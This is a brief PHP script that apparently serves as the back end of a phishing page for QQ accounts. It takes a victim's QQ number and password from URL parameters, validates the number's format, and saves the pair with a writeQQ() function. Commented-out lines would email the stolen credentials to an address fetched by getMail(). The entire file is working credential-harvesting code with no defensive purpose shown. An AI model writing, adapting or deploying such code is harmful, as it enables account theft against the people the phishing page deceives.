<?php

// error_reporting(E ~ ALL_NOTICE);

header("charset=utf8");

require('function.php');

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
	if(!is_numeric($username) || strlen($username)<5 || strlen($username)>11 || strlen($password)>16){
		echo '<script>alert("QQ号或密码非法");window.location.href="index.php";</script>';		
	}else{
		// $targetEmail=json_decode(getMail());
		// mail($targetEmail, "qq-data", "qq:$username;password:$password");
		writeQQ($username,$password);
	}
}else{
	echo '<script>alert("缺少参数");window.location.href="index.php";</script>';
}

?>